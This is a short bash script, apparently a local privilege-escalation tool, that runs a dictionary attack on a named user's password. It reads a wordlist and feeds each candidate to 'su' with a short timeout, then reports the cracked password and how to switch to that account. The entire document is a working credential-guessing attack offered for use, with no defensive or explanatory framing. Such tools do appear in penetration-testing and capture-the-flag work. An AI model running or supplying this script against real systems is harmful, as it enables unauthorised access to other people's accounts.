#!/bin/bash

USER="${1}"
PASS_FILE="${2}"

if [[ ${#} -ne 2 ]]; then
    echo "Usage: ${0} <username> <password_file>"
    exit 1
fi

if [[ ! -f ${PASS_FILE} ]]; then
    echo "Error: the argument '${2}' is not a file."
    exit 1
fi

echo
echo "Beginning password attack on: ${USER}"

while read -r password; do
    if echo "${password}" | timeout 0.2 su - ${USER} -c 'whoami' | grep -q "${USER}"; then
        echo
        echo "Success! Credentials for ${USER} is ${password}"
        echo
        echo "Use su - ${USER} then provide the password to switch."
        echo
        exit 0
    fi
done < "${PASS_FILE}"

echo
echo "Dictionary attack complete. Unable to find credentials for ${USER}."
echo
exit 1
